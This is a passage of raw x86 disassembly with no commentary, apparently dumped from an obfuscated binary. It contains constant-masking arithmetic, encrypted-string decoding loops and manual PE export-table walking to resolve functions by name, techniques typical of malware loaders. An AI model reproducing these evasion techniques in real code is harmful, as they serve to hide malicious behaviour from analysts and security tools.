  418de6:	xor    eax,eax
  418de8:	pop    esi
  418de9:	leave  
  418dea:	ret    
  418deb:	push   ebp
  418dec:	mov    ebp,esp
  418dee:	push   ecx
  418def:	mov    eax,DWORD PTR [ebp+0x8]
  418df2:	movzx  ecx,WORD PTR [eax]
  418df5:	push   esi
  418df6:	lea    eax,[ecx-0x3b51]
  418dfc:	mov    esi,0x8a8d
  418e01:	push   edi
  418e02:	xor    eax,esi
  418e04:	mov    edi,0x4e22
  418e09:	mov    DWORD PTR [ebp-0x4],edx
  418e0c:	cmp    ax,di
  418e0f:	je     0x418e3c
  418e11:	mov    eax,DWORD PTR [ebp+0x8]
  418e14:	sub    eax,edx
  418e16:	mov    DWORD PTR [ebp+0x8],eax
  418e19:	jmp    0x418e1e
  418e1b:	mov    eax,DWORD PTR [ebp+0x8]
  418e1e:	mov    WORD PTR [edx],cx
  418e21:	add    edx,0x2
  418e24:	movzx  edi,WORD PTR [eax+edx*1]
  418e28:	mov    ecx,edi
  418e2a:	add    edi,0xffffc4af
  418e30:	xor    edi,esi
  418e32:	mov    eax,0x4e22
  418e37:	cmp    di,ax
  418e3a:	jne    0x418e1b
  418e3c:	xor    eax,eax
  418e3e:	pop    edi
  418e3f:	mov    WORD PTR [edx],ax
  418e42:	mov    eax,DWORD PTR [ebp-0x4]
  418e45:	pop    esi
  418e46:	leave  
  418e47:	ret    0x4
  418e4a:	push   ebp
  418e4b:	mov    ebp,esp
  418e4d:	sub    esp,0x18
  418e50:	mov    DWORD PTR [ebp-0x14],0xf89c8585
  418e57:	mov    DWORD PTR [ebp-0x18],0xf89c8584
  418e5e:	mov    eax,DWORD PTR [ebp-0x14]
  418e61:	xor    eax,0x751089b
  418e66:	add    eax,0x3272e2
  418e6b:	mov    DWORD PTR [ebp-0x8],eax
  418e6e:	mov    DWORD PTR [ebp-0x10],0xf89c85bd
  418e75:	mov    DWORD PTR [ebp-0xc],0xf89c85b9
  418e7c:	mov    DWORD PTR [ebp-0x4],0xf89c85bb
  418e83:	mov    eax,DWORD PTR [ebp-0x14]
  418e86:	xor    eax,0x751089b
  418e8b:	mov    ecx,DWORD PTR [ebp-0x8]
  418e8e:	lea    eax,[ecx+eax*1+0x3272e2]
  418e95:	mov    ecx,DWORD PTR [ebp-0x18]
  418e98:	xor    ecx,0x751089b
  418e9e:	add    ecx,0x3272e2
  418ea4:	mov    edx,DWORD PTR [ebp+0x10]
  418ea7:	imul   edx,ecx
  418eaa:	cmp    eax,edx
  418eac:	jae    0x418f9f
  418eb2:	mov    eax,DWORD PTR [ebp+0x10]
  418eb5:	mov    ecx,DWORD PTR [ebp-0x8]
  418eb8:	sub    eax,ecx
  418eba:	mov    ecx,DWORD PTR [ebp-0x10]
  418ebd:	xor    ecx,0x751089b
  418ec3:	add    ecx,0x3272e2
  418ec9:	cmp    eax,ecx
  418ecb:	jbe    0x418efd
  418ecd:	mov    eax,DWORD PTR [ebp+0x8]
  418ed0:	add    eax,DWORD PTR [ebp-0x8]
  418ed3:	mov    ecx,DWORD PTR [ebp+0xc]
  418ed6:	add    ecx,DWORD PTR [ebp-0x8]
  418ed9:	mov    edx,DWORD PTR [ecx]
  418edb:	mov    DWORD PTR [eax],edx
  418edd:	mov    ecx,DWORD PTR [ecx+0x4]
  418ee0:	mov    DWORD PTR [eax+0x4],ecx
  418ee3:	mov    eax,DWORD PTR [ebp-0x10]
  418ee6:	xor    eax,0x751089b
  418eeb:	mov    ecx,DWORD PTR [ebp-0x8]
  418eee:	lea    eax,[ecx+eax*1+0x3272e2]
  418ef5:	mov    DWORD PTR [ebp-0x8],eax
  418ef8:	jmp    0x418f9a
  418efd:	mov    eax,DWORD PTR [ebp+0x10]
  418f00:	mov    ecx,DWORD PTR [ebp-0x8]
  418f03:	sub    eax,ecx
  418f05:	mov    ecx,DWORD PTR [ebp-0xc]
  418f08:	xor    ecx,0x751089b
  418f0e:	add    ecx,0x3272e2
  418f14:	cmp    eax,ecx
  418f16:	jbe    0x418f3f
  418f18:	mov    eax,DWORD PTR [ebp+0x8]
  418f1b:	add    eax,DWORD PTR [ebp-0x8]
  418f1e:	mov    ecx,DWORD PTR [ebp+0xc]
  418f21:	add    ecx,DWORD PTR [ebp-0x8]
  418f24:	mov    ecx,DWORD PTR [ecx]
  418f26:	mov    DWORD PTR [eax],ecx
  418f28:	mov    eax,DWORD PTR [ebp-0xc]
  418f2b:	xor    eax,0x751089b
  418f30:	mov    ecx,DWORD PTR [ebp-0x8]
  418f33:	lea    eax,[ecx+eax*1+0x3272e2]
  418f3a:	mov    DWORD PTR [ebp-0x8],eax
  418f3d:	jmp    0x418f9a
  418f3f:	mov    eax,DWORD PTR [ebp+0x10]
  418f42:	mov    ecx,DWORD PTR [ebp-0x8]
  418f45:	sub    eax,ecx
  418f47:	mov    ecx,DWORD PTR [ebp-0x4]
  418f4a:	xor    ecx,0x751089b
  418f50:	add    ecx,0x3272e2
  418f56:	cmp    eax,ecx
  418f58:	jbe    0x418f83
  418f5a:	mov    eax,DWORD PTR [ebp+0x8]
  418f5d:	add    eax,DWORD PTR [ebp-0x8]
  418f60:	mov    ecx,DWORD PTR [ebp+0xc]
  418f63:	add    ecx,DWORD PTR [ebp-0x8]
  418f66:	mov    cx,WORD PTR [ecx]
  418f69:	mov    WORD PTR [eax],cx
  418f6c:	mov    eax,DWORD PTR [ebp-0x4]
  418f6f:	xor    eax,0x751089b
  418f74:	mov    ecx,DWORD PTR [ebp-0x8]
  418f77:	lea    eax,[ecx+eax*1+0x3272e2]
  418f7e:	mov    DWORD PTR [ebp-0x8],eax
  418f81:	jmp    0x418f9a
  418f83:	mov    eax,DWORD PTR [ebp+0x8]
  418f86:	add    eax,DWORD PTR [ebp-0x8]
  418f89:	mov    ecx,DWORD PTR [ebp+0xc]
  418f8c:	add    ecx,DWORD PTR [ebp-0x8]
  418f8f:	mov    cl,BYTE PTR [ecx]
  418f91:	mov    BYTE PTR [eax],cl
  418f93:	mov    eax,DWORD PTR [ebp-0x8]
  418f96:	inc    eax
  418f97:	mov    DWORD PTR [ebp-0x8],eax
  418f9a:	jmp    0x418e83
  418f9f:	leave  
  418fa0:	ret    0xc
  418fa3:	push   ebp
  418fa4:	mov    ebp,esp
  418fa6:	sub    esp,0xc
  418fa9:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  418fb0:	push   esi
  418fb1:	mov    esi,eax
  418fb3:	mov    DWORD PTR [ebp-0x8],0xf89c8584
  418fba:	mov    edx,DWORD PTR [ebp-0x4]
  418fbd:	mov    eax,0x751089b
  418fc2:	xor    edx,eax
  418fc4:	mov    ecx,0x3272e2
  418fc9:	add    edx,ecx
  418fcb:	cmp    esi,edx
  418fcd:	je     0x41900f
  418fcf:	push   ebx
  418fd0:	push   edi
  418fd1:	mov    edx,DWORD PTR [ebp-0x8]
  418fd4:	mov    ebx,DWORD PTR [ebp+0x8]
  418fd7:	xor    edx,eax
  418fd9:	mov    edi,0xffcd8d1e
  418fde:	sub    edi,edx
  418fe0:	add    esi,edi
  418fe2:	lea    edx,[esi-0x3272e2]
  418fe8:	xor    edx,eax
  418fea:	mov    DWORD PTR [ebp-0xc],edx
  418fed:	mov    edx,DWORD PTR [ebp-0x4]
  418ff0:	mov    edi,DWORD PTR [ebp-0xc]
  418ff3:	xor    dl,0x9b
  418ff6:	sub    dl,0x1e
  418ff9:	xor    edi,eax
  418ffb:	mov    BYTE PTR [edi+ebx*1+0x3272e2],dl
  419002:	mov    edx,DWORD PTR [ebp-0x4]
  419005:	xor    edx,eax
  419007:	add    edx,ecx
  419009:	cmp    esi,edx
  41900b:	jne    0x418fd1
  41900d:	pop    edi
  41900e:	pop    ebx
  41900f:	pop    esi
  419010:	leave  
  419011:	ret    0x4
  419014:	push   ebp
  419015:	mov    ebp,esp
  419017:	sub    esp,0x21c
  41901d:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  419024:	mov    DWORD PTR [ebp-0x14],0xf89c8584
  41902b:	mov    eax,DWORD PTR [ebp+0x10]
  41902e:	mov    eax,DWORD PTR [ebp-0x4]
  419031:	mov    ecx,DWORD PTR [ebp+0x8]
  419034:	push   esi
  419035:	push   edi
  419036:	mov    edi,0x751089b
  41903b:	xor    eax,edi
  41903d:	mov    esi,0x3272e2
  419042:	add    eax,esi
  419044:	cmp    eax,ecx
  419046:	mov    eax,DWORD PTR [ebp-0x4]
  419049:	jne    0x419054
  41904b:	xor    eax,edi
  41904d:	add    eax,esi
  41904f:	jmp    0x419100
  419054:	mov    ecx,DWORD PTR [ebp+0xc]
  419057:	xor    eax,edi
  419059:	add    eax,esi
  41905b:	cmp    eax,ecx
  41905d:	jne    0x419064
  41905f:	mov    eax,DWORD PTR [ebp-0x4]
  419062:	jmp    0x41904b
  419064:	lea    eax,[ebp-0x21c]
  41906a:	mov    DWORD PTR [ebp-0x8],eax
  41906d:	mov    eax,DWORD PTR [ebp+0xc]
  419070:	mov    DWORD PTR [ebp-0x10],eax
  419073:	mov    eax,DWORD PTR [ebp-0x4]
  419076:	xor    eax,edi
  419078:	add    eax,esi
  41907a:	mov    DWORD PTR [ebp+0x10],eax
  41907d:	mov    eax,DWORD PTR [ebp+0xc]
  419080:	push   ebx
  419081:	call   0x418d5c
  419086:	mov    ebx,eax
  419088:	mov    eax,DWORD PTR [ebp+0x8]
  41908b:	mov    eax,DWORD PTR [eax+0x14]
  41908e:	jmp    0x4190e8
  419090:	mov    eax,DWORD PTR [ebp+0xc]
  419093:	sub    eax,0x8
  419096:	mov    DWORD PTR [ebp-0xc],eax
  419099:	mov    eax,DWORD PTR [ebp-0xc]
  41909c:	mov    eax,DWORD PTR [eax+0x28]
  41909f:	call   0x418c44
  4190a4:	mov    DWORD PTR [ebp+0x10],eax
  4190a7:	push   DWORD PTR [ebp+0x10]
  4190aa:	mov    edx,DWORD PTR [ebp-0x8]
  4190ad:	call   0x418deb
  4190b2:	mov    eax,DWORD PTR [ebp-0x4]
  4190b5:	xor    eax,edi
  4190b7:	add    eax,esi
  4190b9:	cmp    eax,ebx
  4190bb:	jne    0x4190c5
  4190bd:	mov    eax,DWORD PTR [ebp-0x8]
  4190c0:	call   0x418cd2
  4190c5:	mov    eax,DWORD PTR [ebp-0x14]
  4190c8:	xor    eax,edi
  4190ca:	add    eax,esi
  4190cc:	push   eax
  4190cd:	push   DWORD PTR [ebp-0x10]
  4190d0:	mov    eax,DWORD PTR [ebp-0x8]
  4190d3:	call   0x4189fe
  4190d8:	mov    ecx,DWORD PTR [ebp-0x4]
  4190db:	xor    ecx,edi
  4190dd:	add    ecx,esi
  4190df:	cmp    eax,ecx
  4190e1:	je     0x419106
  4190e3:	mov    eax,DWORD PTR [ebp+0xc]
  4190e6:	mov    eax,DWORD PTR [eax]
  4190e8:	mov    DWORD PTR [ebp+0xc],eax
  4190eb:	mov    eax,DWORD PTR [ebp+0x8]
  4190ee:	mov    ecx,DWORD PTR [ebp+0xc]
  4190f1:	add    eax,0x14
  4190f4:	cmp    ecx,eax
  4190f6:	jne    0x419090
  4190f8:	mov    eax,DWORD PTR [ebp-0x4]
  4190fb:	xor    eax,edi
  4190fd:	add    eax,esi
  4190ff:	pop    ebx
  419100:	pop    edi
  419101:	pop    esi
  419102:	leave  
  419103:	ret    0xc
  419106:	mov    eax,DWORD PTR [ebp-0xc]
  419109:	mov    eax,DWORD PTR [eax+0x18]
  41910c:	jmp    0x4190ff
  41910e:	push   ebp
  41910f:	mov    ebp,esp
  419111:	mov    eax,DWORD PTR [ebp+0xc]
  419114:	sub    esp,0x10
  419117:	cmp    DWORD PTR [ebp+0x8],0x0
  41911b:	push   ebx
  41911c:	push   esi
  41911d:	push   edi
  41911e:	je     0x4191d3
  419124:	test   eax,eax
  419126:	je     0x4191d3
  41912c:	movzx  eax,WORD PTR [eax+0x20]
  419130:	mov    ecx,eax
  419132:	mov    DWORD PTR [ebp-0x10],eax
  419135:	xor    edx,edx
  419137:	and    DWORD PTR [ebp-0x8],edx
  41913a:	mov    eax,0x8a8d
  41913f:	xor    ecx,eax
  419141:	add    ecx,0x3b51
  419147:	mov    DWORD PTR [ebp-0xc],ecx
  41914a:	and    DWORD PTR [ebp-0x4],0x0
  41914e:	xor    ecx,ecx
  419150:	push   0x7e
  419152:	pop    edi
  419153:	cmp    cx,WORD PTR [ebp-0xc]
  419157:	jae    0x4191bd
  419159:	lea    esi,[edx-0x3b51]
  41915f:	xor    esi,eax
  419161:	movzx  ecx,WORD PTR [ebp-0x4]
  419165:	mov    ebx,DWORD PTR [ebp+0xc]
  419168:	lea    ecx,[ebx+ecx*4]
  41916b:	cmp    WORD PTR [ecx+0x2],si
  41916f:	jne    0x4191a8
  419171:	movzx  ecx,WORD PTR [ecx]
  419174:	mov    edi,0x4e22
  419179:	cmp    cx,di
  41917c:	jne    0x41918a
  41917e:	mov    ebx,DWORD PTR [ebp+0x8]
  419181:	movzx  edi,dx
  419184:	cmp    BYTE PTR [edi+ebx*1],0x0
  419188:	je     0x4191b7
  41918a:	mov    ebx,DWORD PTR [ebp+0x8]
  41918d:	movzx  edi,dx
  419190:	movsx  di,BYTE PTR [edi+ebx*1]
  419195:	mov    ebx,0x3b51
  41919a:	sub    di,bx
  41919d:	xor    di,ax
  4191a0:	cmp    cx,di
  4191a3:	je     0x4191b7
  4191a5:	push   0x7c
  4191a7:	pop    edi
  4191a8:	inc    DWORD PTR [ebp-0x4]
  4191ab:	mov    cx,WORD PTR [ebp-0xc]
  4191af:	cmp    WORD PTR [ebp-0x4],cx
  4191b3:	jb     0x419161
  4191b5:	jmp    0x4191bd
  4191b7:	inc    DWORD PTR [ebp-0x8]
  4191ba:	push   0x7d
  4191bc:	pop    edi
  4191bd:	mov    esi,DWORD PTR [ebp+0x8]
  4191c0:	movzx  ecx,dx
  4191c3:	cmp    BYTE PTR [ecx+esi*1],0x0
  4191c7:	je     0x4191dc
  4191c9:	inc    edx
  4191ca:	cmp    edi,0x7c
  4191cd:	jne    0x41914a
  4191d3:	xor    eax,eax
  4191d5:	pop    edi
  4191d6:	pop    esi
  4191d7:	pop    ebx
  4191d8:	leave  
  4191d9:	ret    0x8
  4191dc:	mov    ecx,DWORD PTR [ebp-0x8]
  4191df:	add    ecx,0xffffc4af
  4191e5:	xor    cx,ax
  4191e8:	xor    eax,eax
  4191ea:	cmp    cx,WORD PTR [ebp-0x10]
  4191ee:	sete   al
  4191f1:	jmp    0x4191d5
  4191f3:	push   ebp
  4191f4:	mov    ebp,esp
  4191f6:	sub    esp,0x50
  4191f9:	push   edi
  4191fa:	mov    edi,eax
  4191fc:	mov    eax,DWORD PTR [edi+0x1a8]
  419202:	cmp    DWORD PTR [eax],0x0
  419205:	jne    0x41920e
  419207:	xor    eax,eax
  419209:	jmp    0x41933f
  41920e:	push   DWORD PTR [ebp+0x8]
  419211:	push   0x2c
  419213:	pop    eax
  419214:	call   0x418fa3
  419219:	mov    edx,DWORD PTR [edi+0x1ac]
  41921f:	lea    eax,[edi+0x22]
  419222:	mov    DWORD PTR [ebp-0x4c],eax
  419225:	lea    eax,[edi+0x44]
  419228:	mov    DWORD PTR [ebp-0x48],eax
  41922b:	lea    eax,[edi+0x66]
  41922e:	mov    DWORD PTR [ebp-0x44],eax
  419231:	lea    eax,[edi+0x88]
  419237:	mov    DWORD PTR [ebp-0x40],eax
  41923a:	lea    eax,[edi+0xaa]
  419240:	mov    DWORD PTR [ebp-0x3c],eax
  419243:	lea    eax,[edi+0xcc]
  419249:	mov    DWORD PTR [ebp-0x38],eax
  41924c:	lea    eax,[edi+0xee]
  419252:	mov    DWORD PTR [ebp-0x34],eax
  419255:	lea    eax,[edi+0x110]
  41925b:	mov    DWORD PTR [ebp-0x30],eax
  41925e:	lea    eax,[edi+0x132]
  419264:	mov    DWORD PTR [ebp-0x2c],eax
  419267:	lea    eax,[edi+0x154]
  41926d:	push   edi
  41926e:	mov    DWORD PTR [ebp-0x50],edi
  419271:	mov    DWORD PTR [ebp-0x28],eax
  419274:	call   0x419373
  419279:	push   eax
  41927a:	mov    eax,DWORD PTR [edi+0x1a8]
  419280:	push   DWORD PTR [eax]
  419282:	call   0x419014
  419287:	mov    DWORD PTR [ebp-0x10],eax
  41928a:	test   eax,eax
  41928c:	je     0x41933f
  419292:	mov    ecx,DWORD PTR [eax+0x3c]
  419295:	push   ebx
  419296:	push   esi
  419297:	mov    esi,DWORD PTR [ecx+eax*1+0x78]
  41929b:	add    esi,eax
  41929d:	mov    edi,DWORD PTR [esi+0x24]
  4192a0:	mov    ecx,DWORD PTR [esi+0x1c]
  4192a3:	mov    edx,DWORD PTR [esi+0x20]
  4192a6:	mov    ebx,DWORD PTR [esi+0x18]
  4192a9:	add    edi,eax
  4192ab:	mov    DWORD PTR [ebp-0x20],edi
  4192ae:	mov    edi,DWORD PTR [esi+0x14]
  4192b1:	add    ecx,eax
  4192b3:	add    edx,eax
  4192b5:	mov    DWORD PTR [ebp-0xc],ecx
  4192b8:	mov    DWORD PTR [ebp-0x1c],edx
  4192bb:	mov    DWORD PTR [ebp-0x8],edi
  4192be:	cmp    edi,ebx
  4192c0:	ja     0x4192c5
  4192c2:	mov    DWORD PTR [ebp-0x8],ebx
  4192c5:	xor    ebx,ebx
  4192c7:	mov    DWORD PTR [ebp-0x18],ebx
  4192ca:	cmp    DWORD PTR [ebp-0x8],ebx
  4192cd:	jbe    0x41933d
  4192cf:	jmp    0x4192d4
  4192d1:	mov    edx,DWORD PTR [ebp-0x1c]
  4192d4:	mov    edi,DWORD PTR [ebp-0x20]
  4192d7:	movzx  edi,WORD PTR [edi+ebx*2]
  4192db:	cmp    ebx,DWORD PTR [esi+0x18]
  4192de:	jae    0x41933d
  4192e0:	cmp    edi,DWORD PTR [esi+0x14]
  4192e3:	jae    0x41933d
  4192e5:	mov    ebx,DWORD PTR [edx+ebx*4]
  4192e8:	mov    edx,DWORD PTR [ebp+0x8]
  4192eb:	mov    edi,DWORD PTR [ecx+edi*4]
  4192ee:	mov    DWORD PTR [ebp-0x4],edx
  4192f1:	lea    edx,[ebp-0x50]
  4192f4:	add    ebx,eax
  4192f6:	add    edi,eax
  4192f8:	sub    edx,DWORD PTR [ebp+0x8]
  4192fb:	mov    DWORD PTR [ebp-0x14],0xb
  419302:	mov    DWORD PTR [ebp-0x24],edx
  419305:	mov    edx,DWORD PTR [ebp-0x4]
  419308:	cmp    DWORD PTR [edx],0x0
  41930b:	jne    0x419328
  41930d:	mov    eax,DWORD PTR [ebp-0x24]
  419310:	push   DWORD PTR [eax+edx*1]
  419313:	push   ebx
  419314:	call   0x41910e
  419319:	mov    ecx,DWORD PTR [ebp-0xc]
  41931c:	test   eax,eax
  41931e:	je     0x419325
  419320:	mov    eax,DWORD PTR [ebp-0x4]
  419323:	mov    DWORD PTR [eax],edi
  419325:	mov    eax,DWORD PTR [ebp-0x10]
  419328:	add    DWORD PTR [ebp-0x4],0x4
  41932c:	dec    DWORD PTR [ebp-0x14]
  41932f:	jne    0x419305
  419331:	mov    ebx,DWORD PTR [ebp-0x18]
  419334:	inc    ebx
  419335:	mov    DWORD PTR [ebp-0x18],ebx
  419338:	cmp    ebx,DWORD PTR [ebp-0x8]
  41933b:	jb     0x4192d1
  41933d:	pop    esi
  41933e:	pop    ebx
  41933f:	pop    edi
  419340:	leave  
  419341:	ret    0x4
  419344:	push   ebp
  419345:	mov    ebp,esp
  419347:	mov    eax,DWORD PTR [ebp+0x8]
  41934a:	push   esi
  41934b:	push   DWORD PTR [eax+0x1d8]
  419351:	lea    esi,[eax+0x198]
  419357:	mov    eax,DWORD PTR [ebp+0x8]
  41935a:	call   0x4191f3
  41935f:	mov    ecx,DWORD PTR [esi]
  419361:	mov    DWORD PTR [ecx],eax
  419363:	mov    eax,DWORD PTR [esi]
  419365:	xor    ecx,ecx
  419367:	cmp    DWORD PTR [eax],ecx
  419369:	pop    esi
  41936a:	setne  cl
  41936d:	mov    eax,ecx
  41936f:	pop    ebp
  419370:	ret    0x4
  419373:	mov    ecx,DWORD PTR [edi+0x188]
  419379:	push   ebx
  41937a:	jmp    0x41938f
  41937c:	xor    eax,0x8a8d
  419381:	add    eax,0x3b51
  419386:	mov    WORD PTR [ecx],ax
  419389:	add    ecx,0x2
  41938c:	add    edx,0x2
  41938f:	movzx  eax,WORD PTR [edx]
  419392:	mov    ebx,0x4e22
  419397:	cmp    ax,bx
  41939a:	jne    0x41937c
  41939c:	xor    eax,eax
  41939e:	mov    WORD PTR [ecx],ax
  4193a1:	mov    eax,DWORD PTR [edi+0x188]
  4193a7:	pop    ebx
  4193a8:	ret    
  4193a9:	push   edi
  4193aa:	mov    edi,eax
  4193ac:	mov    eax,DWORD PTR [esi+0x188]
  4193b2:	shl    edi,0x6
  4193b5:	add    eax,edi
  4193b7:	jmp    0x4193c3
  4193b9:	xor    cl,0x74
  4193bc:	sub    cl,0x8
  4193bf:	mov    BYTE PTR [eax],cl
  4193c1:	inc    eax
  4193c2:	inc    edx
  4193c3:	mov    cl,BYTE PTR [edx]
  4193c5:	cmp    cl,0x7c
  4193c8:	jne    0x4193b9
  4193ca:	mov    BYTE PTR [eax],0x0
  4193cd:	mov    eax,DWORD PTR [esi+0x188]
  4193d3:	add    eax,edi
  4193d5:	pop    edi
  4193d6:	ret    
  4193d7:	push   ebp
  4193d8:	mov    ebp,esp
  4193da:	sub    esp,0x38
  4193dd:	push   ebx
  4193de:	mov    ebx,0xf89c8585
  4193e3:	mov    DWORD PTR [ebp-0x4],ebx
  4193e6:	lea    eax,[ebx-0x1]
  4193e9:	push   esi
  4193ea:	mov    DWORD PTR [ebp-0x24],eax
  4193ed:	mov    ecx,DWORD PTR [ebp-0x4]
  4193f0:	mov    edx,DWORD PTR [ebp+0x8]
  4193f3:	mov    esi,0x751089b
  4193f8:	push   edi
  4193f9:	xor    ecx,esi
  4193fb:	mov    edi,0x3272e2
  419400:	add    ecx,edi
  419402:	cmp    edx,ecx
  419404:	je     0x419572
  41940a:	mov    ecx,DWORD PTR [ebp-0x4]
  41940d:	mov    edx,DWORD PTR [ebp+0xc]
  419410:	xor    ecx,esi
  419412:	add    ecx,edi
  419414:	cmp    edx,ecx
  419416:	je     0x419572
  41941c:	mov    ecx,DWORD PTR [ebp+0x10]
  41941f:	mov    DWORD PTR [ebp-0x18],ecx
  419422:	mov    ecx,DWORD PTR [ebp+0xc]
  419425:	mov    DWORD PTR [ebp-0x14],ecx
  419428:	mov    ecx,DWORD PTR [ebp+0x8]
  41942b:	mov    DWORD PTR [ebp-0x1c],0xf89c8507
  419432:	mov    DWORD PTR [ebp-0x20],eax
  419435:	mov    DWORD PTR [ebp-0x10],ebx
  419438:	mov    DWORD PTR [ebp+0xc],eax
  41943b:	mov    DWORD PTR [ebp+0x10],0xf89c85bb
  419442:	mov    eax,DWORD PTR [ebp+0xc]
  419445:	mov    DWORD PTR [ebp-0xc],ecx
  419448:	xor    eax,esi
  41944a:	mov    ecx,0xffcd8d1e
  41944f:	sub    ecx,eax
  419451:	add    ecx,DWORD PTR [ebp-0x14]
  419454:	mov    DWORD PTR [ebp+0x8],ecx
  419457:	mov    DWORD PTR [ebp-0x8],0xf89c85b8
  41945e:	jmp    0x419562
  419463:	mov    eax,DWORD PTR [ebp+0xc]
  419466:	mov    ecx,DWORD PTR [ebp+0xc]
  419469:	xor    eax,esi
  41946b:	xor    ecx,esi
  41946d:	lea    ecx,[eax+ecx*1+0x64e5c4]
  419474:	mov    eax,DWORD PTR [ebp+0x8]
  419477:	xor    edx,edx
  419479:	div    ecx
  41947b:	mov    eax,DWORD PTR [ebp+0x10]
  41947e:	mov    ecx,DWORD PTR [ebp+0xc]
  419481:	xor    eax,esi
  419483:	xor    ecx,esi
  419485:	sub    eax,ecx
  419487:	cmp    edx,eax
  419489:	jne    0x41951e
  41948f:	mov    eax,DWORD PTR [ebp+0x8]
  419492:	add    eax,DWORD PTR [ebp-0xc]
  419495:	mov    dl,BYTE PTR [eax]
  419497:	mov    eax,DWORD PTR [ebp-0x10]
  41949a:	mov    ecx,DWORD PTR [ebp-0x8]
  41949d:	xor    eax,esi
  41949f:	xor    ecx,esi
  4194a1:	add    eax,edi
  4194a3:	add    ecx,edi
  4194a5:	cmp    eax,ecx
  4194a7:	jae    0x4194ef
  4194a9:	lea    ecx,[eax-0x3272e2]
  4194af:	mov    DWORD PTR [ebp-0x4],ecx
  4194b2:	mov    ebx,DWORD PTR [ebp-0x4]
  4194b5:	xor    ebx,esi
  4194b7:	add    ebx,0x7f55d8fb
  4194bd:	lea    ecx,[ebp+eax*4-0x38]
  4194c1:	mov    DWORD PTR [ecx],ebx
  4194c3:	mov    ebx,DWORD PTR [ecx]
  4194c5:	cmp    ebx,0x244ecbda
  4194cb:	jbe    0x4194d5
  4194cd:	add    DWORD PTR [ecx],0x405fc19
  4194d3:	jmp    0x4194db
  4194d5:	add    DWORD PTR [ecx],0xfdaf43e7
  4194db:	mov    ecx,DWORD PTR [ebp-0x8]
  4194de:	xor    ecx,esi
  4194e0:	inc    eax
  4194e1:	inc    DWORD PTR [ebp-0x4]
  4194e4:	add    ecx,edi
  4194e6:	cmp    eax,ecx
  4194e8:	jb     0x4194b2
  4194ea:	mov    ebx,0xf89c8585
  4194ef:	mov    eax,DWORD PTR [ebp-0x18]
  4194f2:	test   eax,eax
  4194f4:	jne    0x4194fe
  4194f6:	xor    dl,0x74
  4194f9:	sub    dl,0x8
  4194fc:	jmp    0x419514
  4194fe:	mov    eax,DWORD PTR [ebp-0x1c]
  419501:	xor    al,0x9b
  419503:	mov    cl,0x1e
  419505:	sub    cl,al
  419507:	add    dl,cl
  419509:	mov    ecx,DWORD PTR [ebp-0x20]
  41950c:	xor    cl,0x9b
  41950f:	sub    cl,0x1e
  419512:	ror    dl,cl
  419514:	xor    eax,eax
  419516:	mov    eax,DWORD PTR [ebp+0x8]
  419519:	add    eax,DWORD PTR [ebp-0xc]
  41951c:	mov    BYTE PTR [eax],dl
  41951e:	mov    eax,DWORD PTR [ebp+0x8]
  419521:	mov    ecx,DWORD PTR [ebp-0x10]
  419524:	sub    eax,edi
  419526:	xor    eax,esi
  419528:	cmp    eax,ecx
  41952a:	jne    0x419550
  41952c:	mov    eax,DWORD PTR [ebp+0x10]
  41952f:	mov    ecx,DWORD PTR [ebp+0xc]
  419532:	xor    eax,esi
  419534:	xor    ecx,esi
  419536:	sub    eax,ecx
  419538:	sub    eax,edi
  41953a:	xor    eax,esi
  41953c:	mov    DWORD PTR [ebp+0x10],eax
  41953f:	mov    eax,DWORD PTR [ebp+0xc]
  419542:	xor    eax,esi
  419544:	mov    ecx,0xffcd8d1e
  419549:	sub    ecx,eax
  41954b:	add    ecx,DWORD PTR [ebp-0x14]
  41954e:	jmp    0x41955f
  419550:	mov    eax,DWORD PTR [ebp+0xc]
  419553:	xor    eax,esi
  419555:	mov    ecx,0xffcd8d1e
  41955a:	sub    ecx,eax
  41955c:	add    ecx,DWORD PTR [ebp+0x8]
  41955f:	mov    DWORD PTR [ebp+0x8],ecx
  419562:	mov    eax,DWORD PTR [ebp+0x10]
  419565:	cmp    eax,ebx
  419567:	jne    0x419463
  41956d:	mov    eax,DWORD PTR [ebp-0x24]
  419570:	jmp    0x419575
  419572:	mov    eax,DWORD PTR [ebp-0x4]
  419575:	xor    eax,esi
  419577:	add    eax,edi
  419579:	pop    edi
  41957a:	pop    esi
  41957b:	pop    ebx
  41957c:	leave  
  41957d:	ret    0xc
  419580:	push   ebp
  419581:	mov    ebp,esp
  419583:	sub    esp,0x14
  419586:	mov    DWORD PTR [ebp-0x10],0xf89c8585
  41958d:	mov    DWORD PTR [ebp-0x4],0xf89c8584
  419594:	mov    eax,DWORD PTR [ebx]
  419596:	mov    DWORD PTR [ebp-0x8],eax
  419599:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  4195a0:	push   esi
  4195a1:	push   edi
  4195a2:	mov    DWORD PTR [ebp-0x14],0xead718a5
  4195a9:	mov    edi,DWORD PTR [ebp-0x4]
  4195ac:	mov    ecx,DWORD PTR [ebp-0x10]
  4195af:	mov    eax,0x751089b
  4195b4:	xor    edi,eax
  4195b6:	mov    edx,0x3272e2
  4195bb:	xor    ecx,eax
  4195bd:	add    edi,edx
  4195bf:	add    ecx,edx
  4195c1:	imul   edi,ecx
  4195c4:	jmp    0x41960c
  4195c6:	mov    ecx,DWORD PTR [ebp-0x8]
  4195c9:	mov    esi,DWORD PTR [ebp-0x4]
  4195cc:	xor    ecx,eax
  4195ce:	xor    esi,eax
  4195d0:	add    ecx,edx
  4195d2:	add    esi,edx
  4195d4:	test   esi,ecx
  4195d6:	mov    esi,DWORD PTR [ebp-0x8]
  4195d9:	mov    ecx,DWORD PTR [ebp-0x4]
  4195dc:	je     0x4195f3
  4195de:	xor    ecx,eax
  4195e0:	xor    esi,eax
  4195e2:	add    ecx,edx
  4195e4:	add    esi,edx
  4195e6:	shr    esi,cl
  4195e8:	mov    ecx,DWORD PTR [ebp-0x14]
  4195eb:	xor    ecx,eax
  4195ed:	add    ecx,edx
  4195ef:	xor    esi,ecx
  4195f1:	jmp    0x4195fd
  4195f3:	xor    esi,eax
  4195f5:	xor    ecx,eax
  4195f7:	add    esi,edx
  4195f9:	add    ecx,edx
  4195fb:	shr    esi,cl
  4195fd:	mov    DWORD PTR [ebp-0x8],esi
  419600:	mov    ecx,DWORD PTR [ebp-0x4]
  419603:	xor    ecx,eax
  419605:	lea    edi,[edi+ecx*1+0x3272e2]
  41960c:	mov    ecx,DWORD PTR [ebp-0xc]
  41960f:	mov    esi,DWORD PTR [ebp-0x4]
  419612:	xor    esi,eax
  419614:	xor    ecx,eax
  419616:	sub    ecx,esi
  419618:	cmp    edi,ecx
  41961a:	jbe    0x4195c6
